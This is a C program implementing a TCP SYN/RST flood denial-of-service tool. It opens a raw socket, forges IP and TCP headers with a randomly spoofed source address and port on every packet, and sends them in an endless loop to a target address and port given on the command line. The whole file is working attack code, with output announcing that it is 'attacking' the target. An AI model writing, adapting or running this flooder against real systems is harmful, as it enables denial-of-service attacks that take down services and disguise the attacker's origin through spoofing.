
#include "flood.h"
#include <arpa/inet.h>
#include <errno.h>
#include <getopt.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_PORT 80

int countOfPacket = 0;
int sending = 1;
char source_ip[32];

struct pseudo_header // for checksum calculation
{
  unsigned int source_address;
  unsigned int dest_address;
  unsigned char placeholder;
  unsigned char protocol;
  unsigned short tcp_length;

  struct tcphdr tcp;
};

// random number for port spoofing(0-65535)
int randomPort(void) { return rand() % 65535; }

// random number for IP spoofing(0-255)
int _randomForIp(void) { return rand() % 255; }

// IP spoofer
char *randomIp() {
  strcpy(source_ip, "");
  int dots = 0;
  while (dots < 3) {
    sprintf(source_ip, "%s%d", source_ip, _randomForIp());
    strcat(source_ip, ".");
    fflush(NULL);
    dots++;
  }
  sprintf(source_ip, "%s%d", source_ip, _randomForIp());
  strcat(source_ip, "\0");
  return source_ip;
}

int validIp(char *ip) {
  struct sockaddr_in sa;
  return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
}

// interrupt for Ctrl+C command
void sigintHandler(int sig) {
  sending = 0;
  printf("\n%d [DATA] packets sent\n", countOfPacket);
  exit(0);
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
  register long sum;
  unsigned short oddbyte;
  register short ans;
  sum = 0;
  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }
  if (nbytes == 1) {
    oddbyte = 0;
    *((u_char *)&oddbyte) = *(u_char *)ptr;
    sum += oddbyte;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum = sum + (sum >> 16);
  ans = (short)~sum;

  return (ans);
}

int main(int argc, char *argv[]) {
  int destination_port = DEFAULT_PORT;
  char destination_ip[32] = DEFAULT_IP;
  int flagRst = 0;
  int flagSyn = 1;
  int opt = 0;

  srand(time(0));                // gives the random function a new seed
  signal(SIGINT, sigintHandler); // send interrupt for  Ctrl+C command

  while ((opt = getopt(argc, argv, "t:p:r")) != -1) {
    switch (opt) {
    case 't':
      strcpy(destination_ip, optarg);
      if (!validIp(destination_ip)) {
        printf("[ERROR] invalid ip - Program terminated\n");
        exit(1);
      }
      break;
    case 'p':
      destination_port = strtol(optarg, NULL, 10);
      if (destination_port < 0 || destination_port > 65535) {
        printf("[ERROR] invalid port - Program terminated\n");
        exit(1);
      }
      break;
    case 'r':
      flagRst = 1;
      flagSyn = 0;
      break;
    default:
      printf("[ERROR] Program terminated\n");
      exit(1);
    }
  }
  printf("[DATA] Flood is starting...\n");

  // Create a raw socket
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

  // Datagram to represent the packet
  char datagram[4096];

  // IP header
  struct iphdr *iph = (struct iphdr *)datagram;

  // TCP header
  struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
  struct sockaddr_in sin;
  struct pseudo_header psh;

  sin.sin_addr.s_addr = inet_addr(destination_ip); // set destination ip
  sin.sin_port = htons(5060);                      // socket port
  sin.sin_family = AF_INET;                        // set to ipv4

  memset(datagram, 0, 4096); /* clean the buffer */

  // IP Header
  iph->ihl = 5;                                             // header length
  iph->version = 4;                                         // Version
  iph->tos = 0;                                             // Type of service
  iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); // Total length
  iph->id = htons(54321);                                   // Id of this packet
  iph->frag_off = 0;                // Fragmentation offset
  iph->ttl = 255;                   // Time to live
  iph->protocol = IPPROTO_TCP;      // Protocol tcp
  iph->check = 0;                   // Set to 0 before calculating checksum
  iph->daddr = sin.sin_addr.s_addr; // set dest IP

  // TCP Header
  tcph->dest = htons(destination_port); // Destination port
  tcph->seq = 0;                        // Sequence number
  tcph->ack_seq = 0;
  tcph->doff = 5; /* Data offset */
  tcph->fin = 0;
  tcph->syn = flagSyn;
  tcph->rst = flagRst;
  tcph->psh = 0;
  tcph->ack = 0;
  tcph->urg = 0;
  tcph->window = htons(5840); /* maximum window size */
  tcph->urg_ptr = 0;

  // IP checksum
  psh.dest_address = sin.sin_addr.s_addr;
  psh.placeholder = 0;
  psh.protocol = IPPROTO_TCP;
  psh.tcp_length = htons(20);

  // tells the kernel that the IP header is included so it will fill the data
  // link layer information.
  // Ethernet header IP_HDRINCL to tell the kernel that headers are included
  // in the packet
  int one = 1;
  const int *val = &one;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
    printf("[ERROR] number : %d  Error message : %s \n", errno,
           strerror(errno));
    fprintf(stderr, "Program needs to be run by "
                    "Admin/root user\n");
    exit(1);
  }

  printf("[DATA] attacking ip %s on port %d and RST flag is %d...\n",
         destination_ip, destination_port, flagRst);

  while (sending) {
    iph->saddr = inet_addr(randomIp()); // random ip the source ip address
    iph->check = checksum((unsigned short *)datagram,
                          iph->tot_len >> 1); /* checksum for ip header*/

    psh.source_address =
        inet_addr(source_ip); /*update source ip in IP checksum*/

    tcph->source = htons(randomPort()); /*random spoof port */
    tcph->check = 0;                    /*checksum is set to zero */

    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

    tcph->check =
        checksum((unsigned short *)&psh,
                 sizeof(struct pseudo_header)); /* checksum for tcp header*/
    /*
    Send the packet:our socket,the buffer containing headers and data,total
    length of our datagram,routing flags, normally always 0,socket addr, just
    like in,a normal send()
    */
    if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin,
               sizeof(sin)) < 0) {
      printf("\n[ERROR] Program terminated\n");
      exit(1);
    } else {
      // sent successfully
      countOfPacket++;
    }
  }
  close(s);
  return 0;
}
